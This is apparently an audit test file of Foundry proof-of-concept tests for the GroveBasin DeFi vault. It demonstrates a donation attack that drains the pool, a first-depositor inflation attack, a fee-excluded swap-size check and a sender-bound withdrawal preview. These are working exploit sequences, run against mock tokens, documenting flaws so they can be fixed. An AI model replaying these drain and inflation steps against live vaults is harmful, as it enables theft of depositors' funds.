// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.34;

import "forge-std/Test.sol";

import { GroveBasin } from "src/GroveBasin.sol";

import { MockERC20 } from "erc20-helpers/MockERC20.sol";

import { MockRateProvider } from "test/mocks/MockRateProvider.sol";

/// @title GroveBasin Audit Tests
/// @notice Proof-of-concept tests demonstrating vulnerabilities found during the audit.
/// @dev These tests run without an external pocket (groveBasin is its own pocket) to avoid
///      the setUp revert caused by the test-base using `pocket = address(0)`.
contract AuditTestBase is Test {

    address public owner  = makeAddr("owner");

    GroveBasin public groveBasin;

    MockERC20 public swapToken;
    MockERC20 public collateralToken;
    MockERC20 public creditToken;

    MockRateProvider public swapTokenRateProvider;
    MockRateProvider public collateralTokenRateProvider;
    MockRateProvider public creditTokenRateProvider;

    function setUp() public virtual {
        swapToken       = new MockERC20("swapToken",       "swapToken",  6);
        collateralToken = new MockERC20("collateralToken", "collateral", 18);
        creditToken     = new MockERC20("creditToken",     "credit",     18);

        swapTokenRateProvider       = new MockRateProvider();
        collateralTokenRateProvider = new MockRateProvider();
        creditTokenRateProvider     = new MockRateProvider();

        // swapToken ($1), collateral ($1), credit ($1.25)
        swapTokenRateProvider.__setConversionRate(1e27);
        collateralTokenRateProvider.__setConversionRate(1e27);
        creditTokenRateProvider.__setConversionRate(1.25e27);

        groveBasin = new GroveBasin(
            owner,
            address(swapToken),
            address(collateralToken),
            address(creditToken),
            address(swapTokenRateProvider),
            address(collateralTokenRateProvider),
            address(creditTokenRateProvider)
        );

        vm.startPrank(owner);
        groveBasin.grantRole(groveBasin.MANAGER_ADMIN_ROLE(), owner);
        groveBasin.setMaxSwapSize(type(uint256).max);
        vm.stopPrank();
    }
}

// ---------------------------------------------------------------------------
// FINDING 1 (Critical): Token Donation Breaks Share Accounting —
//                        Any Address Can Drain Pool When totalShares == 0
// ---------------------------------------------------------------------------
// Root cause: `convertToShares` returns 0 when totalShares == 0 but
//             totalAssets != 0. Two related bugs emerge:
//   (A) Deposits after donation mint 0 shares (depositor is under-credited).
//   (B) `_convertToSharesRoundUp` also returns 0 when totalShares == 0,
//       so `previewWithdraw` returns (sharesToBurn=0, assetsWithdrawn=fullBalance).
//       ANY caller — even one with 0 shares — can drain the entire pool.
// ---------------------------------------------------------------------------
contract DonationAttackTest is AuditTestBase {

    address public attacker = makeAddr("attacker");
    address public victim1  = makeAddr("victim1");
    address public victim2  = makeAddr("victim2");

    /// @notice Part A — A depositor who arrives after the donation receives 0 shares,
    ///         meaning their proportional ownership is never recorded.
    function test_donationAttack_depositorGetsZeroShares() public {
        assertEq(groveBasin.totalShares(), 0);
        assertEq(groveBasin.totalAssets(), 0);

        // Attacker donates 100 USDC directly to the basin (bypass deposit()).
        swapToken.mint(attacker, 100e6);
        vm.prank(attacker);
        swapToken.transfer(address(groveBasin), 100e6);

        // Basin has $100 of assets but ZERO shares.
        assertEq(groveBasin.totalAssets(), 100e18);
        assertEq(groveBasin.totalShares(), 0);

        // Victim deposits 1,000,000 USDC.
        swapToken.mint(victim1, 1_000_000e6);
        vm.startPrank(victim1);
        swapToken.approve(address(groveBasin), 1_000_000e6);
        uint256 sharesReceived = groveBasin.deposit(address(swapToken), victim1, 1_000_000e6);
        vm.stopPrank();

        // Victim receives ZERO shares despite depositing $1M.
        assertEq(sharesReceived, 0, "victim should receive 0 shares (bug)");
        assertEq(groveBasin.shares(victim1), 0, "victim share balance is 0");
        assertEq(groveBasin.totalShares(), 0, "totalShares still 0 after deposit");
    }

    /// @notice Part B — When totalShares == 0, `previewWithdraw` computes
    ///         sharesToBurn = 0 regardless of the caller's share balance.
    ///         Any address (even the attacker with 0 shares) can withdraw the
    ///         entire pool after the donation has driven totalShares to zero.
    function test_donationAttack_anyCallerCanDrainPool() public {
        // Attacker donates to break the invariant.
        swapToken.mint(attacker, 100e6);
        vm.prank(attacker);
        swapToken.transfer(address(groveBasin), 100e6);

        // Victim deposits $1M, receives 0 shares.
        swapToken.mint(victim1, 1_000_000e6);
        vm.startPrank(victim1);
        swapToken.approve(address(groveBasin), 1_000_000e6);
        groveBasin.deposit(address(swapToken), victim1, 1_000_000e6);
        vm.stopPrank();

        assertEq(groveBasin.totalShares(), 0);
        assertEq(swapToken.balanceOf(address(groveBasin)), 1_000_100e6);

        // Attacker (0 shares) calls withdraw and drains the entire pool.
        vm.prank(attacker);
        uint256 stolen = groveBasin.withdraw(address(swapToken), attacker, type(uint256).max);

        // Attacker withdraws ALL funds from the basin without ever depositing legitimately.
        assertEq(stolen, 1_000_100e6, "attacker drains the entire pool");
        assertEq(swapToken.balanceOf(attacker), 1_000_100e6, "attacker holds all USDC");
        assertEq(swapToken.balanceOf(address(groveBasin)), 0, "basin is drained");

        // Victim's deposit is completely stolen.
        vm.prank(victim1);
        uint256 victimWithdrawn = groveBasin.withdraw(address(swapToken), victim1, type(uint256).max);
        assertEq(victimWithdrawn, 0, "victim cannot recover any funds");
        assertEq(swapToken.balanceOf(victim1), 0, "victim loses $1M deposit");
    }

    /// @notice Part C — The attack generalises: when multiple depositors arrive
    ///         after the donation, only the FIRST withdrawer receives anything;
    ///         all others lose their deposits entirely (race condition).
    function test_donationAttack_raceConditionMultipleDepositors() public {
        swapToken.mint(attacker, 100e6);
        vm.prank(attacker);
        swapToken.transfer(address(groveBasin), 100e6);

        // Two victims each deposit $1M.
        swapToken.mint(victim1, 1_000_000e6);
        vm.startPrank(victim1);
        swapToken.approve(address(groveBasin), 1_000_000e6);
        groveBasin.deposit(address(swapToken), victim1, 1_000_000e6);
        vm.stopPrank();

        swapToken.mint(victim2, 1_000_000e6);
        vm.startPrank(victim2);
        swapToken.approve(address(groveBasin), 1_000_000e6);
        groveBasin.deposit(address(swapToken), victim2, 1_000_000e6);
        vm.stopPrank();

        assertEq(groveBasin.totalShares(), 0, "both victims got 0 shares");
        assertEq(swapToken.balanceOf(address(groveBasin)), 2_000_100e6);

        // Victim1 withdraws first — gets the entire pool (2M + donation).
        vm.prank(victim1);
        uint256 v1Withdrawn = groveBasin.withdraw(address(swapToken), victim1, type(uint256).max);
        assertEq(v1Withdrawn, 2_000_100e6, "victim1 gets everything");

        // Victim2 gets nothing.
        vm.prank(victim2);
        uint256 v2Withdrawn = groveBasin.withdraw(address(swapToken), victim2, type(uint256).max);
        assertEq(v2Withdrawn, 0, "victim2 gets nothing");
        assertEq(swapToken.balanceOf(victim2), 0, "victim2 loses $1M");
    }
}

// ---------------------------------------------------------------------------
// FINDING 2 (High): Inflation Attack – Front-Running First Depositor
// ---------------------------------------------------------------------------
// Root cause: With 1 share outstanding, an attacker can inflate the price/share
//             by donating tokens, causing subsequent depositors to receive fewer
//             shares than expected (due to rounding) while the attacker profits.
// ---------------------------------------------------------------------------
contract InflationAttackTest is AuditTestBase {

    address public attacker        = makeAddr("attacker");
    address public firstDepositor  = makeAddr("firstDepositor");

    /// @notice Shows the classic inflation attack where an attacker gets 1 share
    ///         cheaply, donates a large amount to inflate the exchange rate, then
    ///         a victim's deposit is rounded down to 1 share, allowing the attacker
    ///         to steal ~2.5M USDC from the victim.
    ///
    ///         Scenario:
    ///         - Attacker deposits 1 wei creditToken → 1 share
    ///         - Attacker donates 10,000,000 USDC → price per share ≈ $10M
    ///         - Victim deposits 15,000,000 USDC → rounds down to 1 share
    ///         - Both hold 1 share of a 25M pool → each withdraws 12.5M
    ///         - Attacker net profit: +$2.5M; Victim net loss: -$2.5M
    function test_inflationAttack_swapToken() public {
        // NOTE: This requires no initial dead-shares deposit (as GroveBasinDeploy provides).

        // Step 1: Attacker deposits 1 wei creditToken — gets 1 share at minimal cost.
        creditToken.mint(attacker, 1);
        vm.startPrank(attacker);
        creditToken.approve(address(groveBasin), 1);
        groveBasin.deposit(address(creditToken), attacker, 1);
        vm.stopPrank();

        assertEq(groveBasin.shares(attacker), 1, "attacker should have 1 share");
        assertEq(groveBasin.totalShares(), 1);

        // Step 2: Attacker donates 10,000,000 USDC directly to basin (bypass deposit).
        // totalAssets ≈ $10M; price-per-share ≈ $10M.
        swapToken.mint(attacker, 10_000_000e6);
        vm.prank(attacker);
        swapToken.transfer(address(groveBasin), 10_000_000e6);

        // Verify massively inflated exchange rate.
        uint256 valuePerShare = groveBasin.convertToAssetValue(1);
        assertGt(valuePerShare, 10_000_000e18, "price per share should exceed $10M");

        // Step 3: Victim deposits 15,000,000 USDC.
        // Value = 15e25 (in 1e18 USD scale); totalAssets ≈ 1e25 → shares = floor(1.5) = 1.
        swapToken.mint(firstDepositor, 15_000_000e6);
        vm.startPrank(firstDepositor);
        swapToken.approve(address(groveBasin), 15_000_000e6);
        uint256 victimShares = groveBasin.deposit(address(swapToken), firstDepositor, 15_000_000e6);
        vm.stopPrank();

        // Victim rounds down to exactly 1 share — same as the attacker.
        assertEq(victimShares, 1, "victim should be rounded to 1 share");
        assertEq(groveBasin.totalShares(), 2, "2 total shares");

        // Step 4: Both withdraw all.
        vm.prank(firstDepositor);
        groveBasin.withdraw(address(swapToken), firstDepositor, type(uint256).max);

        vm.prank(attacker);
        groveBasin.withdraw(address(swapToken), attacker, type(uint256).max);

        uint256 attackerOut      = swapToken.balanceOf(attacker);
        uint256 firstDepositorOut = swapToken.balanceOf(firstDepositor);

        // Pool had 25M USDC (10M donation + 15M victim), split 50/50 between 2 shares.
        // Attacker: deposited ~0 + donated 10M → receives ~12.5M → net profit ~+$2.5M
        // Victim:   deposited 15M → receives ~12.5M → net loss ~-$2.5M
        assertApproxEqAbs(attackerOut,       12_500_000e6, 1e6, "attacker withdraws ~12.5M");
        assertApproxEqAbs(firstDepositorOut, 12_500_000e6, 1e6, "victim withdraws ~12.5M");

        // Attacker profited (received more than 10M donated).
        assertGt(attackerOut, 10_000_000e6, "attacker should have profited over donation");
        // Victim lost (received less than 15M deposited).
        assertLt(firstDepositorOut, 15_000_000e6, "firstDepositor should have lost funds");
    }
}

// ---------------------------------------------------------------------------
// FINDING 3 (Medium): previewSwapExactOut maxSwapSize Check Excludes Fee
// ---------------------------------------------------------------------------
// Root cause: In `previewSwapExactOut`, the maxSwapSize check is performed on
//             `amountIn` BEFORE fees are added. The actual amount paid by the
//             user (amountIn + fee) can exceed the intended maxSwapSize limit.
// ---------------------------------------------------------------------------
contract MaxSwapSizeFeeBypassTest is AuditTestBase {

    address public swapper  = makeAddr("swapper");
    address public receiver = makeAddr("receiver");

    function setUp() public override {
        super.setUp();

        // Seed liquidity
        creditToken.mint(address(groveBasin), 10_000e18);
        swapToken.mint(address(groveBasin), 10_000e6);

        vm.startPrank(owner);
        // Set maxSwapSize to exactly $100
        groveBasin.setMaxSwapSize(100e18);
        // Set fee bounds and purchase fee to 50% (extreme case to illustrate)
        groveBasin.setFeeBounds(0, 5_000);
        vm.stopPrank();

        // Grant manager role and set fees
        vm.prank(owner);
        groveBasin.grantRole(groveBasin.MANAGER_ROLE(), owner);

        vm.prank(owner);
        groveBasin.setPurchaseFee(5_000); // 50% fee
    }

    /// @notice Demonstrates that a user can effectively swap more than the maxSwapSize
    ///         because the fee is added to `amountIn` AFTER the size check.
    function test_maxSwapSize_feeNotIncludedInCheck() public {
        // We want exactly $100 worth of creditToken out.
        // creditToken rate = 1.25, so $100 worth = 80e18 creditToken.
        uint256 desiredOut = 80e18; // $100 worth

        // previewSwapExactOut: amountIn_base = 100e6 USDC (= $100 USD value)
        // maxSwapSize check: $100 <= $100 ✓ passes
        uint256 amountIn = groveBasin.previewSwapExactOut(
            address(swapToken),
            address(creditToken),
            desiredOut
        );

        // amountIn should be 100e6 (base) + 50% fee = 150e6 USDC
        assertEq(amountIn, 150e6, "amountIn includes 50% fee");

        // The ACTUAL value paid ($150) exceeds the intended maxSwapSize ($100).
        // The check only validated the base amount ($100), not the total ($150).
        uint256 actualValuePaid = amountIn * 1e27 / 1e9 / 1e6; // = $150 in 1e18 scale
        assertGt(actualValuePaid, groveBasin.maxSwapSize(),
            "actual value paid exceeds maxSwapSize");

        // The swap still succeeds even though the total paid exceeds maxSwapSize.
        swapToken.mint(swapper, amountIn);
        vm.startPrank(swapper);
        swapToken.approve(address(groveBasin), amountIn);
        groveBasin.swapExactOut(
            address(swapToken),
            address(creditToken),
            desiredOut,
            amountIn,
            receiver,
            0
        );
        vm.stopPrank();

        assertEq(creditToken.balanceOf(receiver), desiredOut);
    }
}

// ---------------------------------------------------------------------------
// FINDING 4 (Medium): previewWithdraw Is Tied to msg.sender, Unusable as
//                      General-Purpose Off-Chain Preview
// ---------------------------------------------------------------------------
// Root cause: `previewWithdraw` hard-codes `shares[msg.sender]` as the share
//             balance to cap against. Any external caller (e.g., UI contract
//             or aggregator) calling on behalf of a different address gets
//             incorrect results.
// ---------------------------------------------------------------------------
contract PreviewWithdrawMsgSenderTest is AuditTestBase {

    address public depositor = makeAddr("depositor");
    address public uiHelper  = makeAddr("uiHelper");

    function test_previewWithdraw_incorrectForThirdPartyCallers() public {
        // Depositor deposits 100 USDC.
        swapToken.mint(depositor, 100e6);
        vm.startPrank(depositor);
        swapToken.approve(address(groveBasin), 100e6);
        groveBasin.deposit(address(swapToken), depositor, 100e6);
        vm.stopPrank();

        assertEq(groveBasin.shares(depositor), 100e18);

        // UI helper tries to preview how much the depositor can withdraw.
        // The UI is calling previewWithdraw, so msg.sender = uiHelper.
        vm.prank(uiHelper);
        (uint256 sharesToBurn, uint256 assetsWithdrawn) =
            groveBasin.previewWithdraw(address(swapToken), 100e6);

        // Returns 0 shares / 0 assets because uiHelper has no shares.
        assertEq(sharesToBurn,     0, "third-party preview returns 0 shares");
        assertEq(assetsWithdrawn,  0, "third-party preview returns 0 assets");

        // Correct result (from depositor's perspective):
        vm.prank(depositor);
        (uint256 correctShares, uint256 correctAssets) =
            groveBasin.previewWithdraw(address(swapToken), 100e6);

        assertEq(correctShares,  100e18);
        assertEq(correctAssets,  100e6);
    }
}
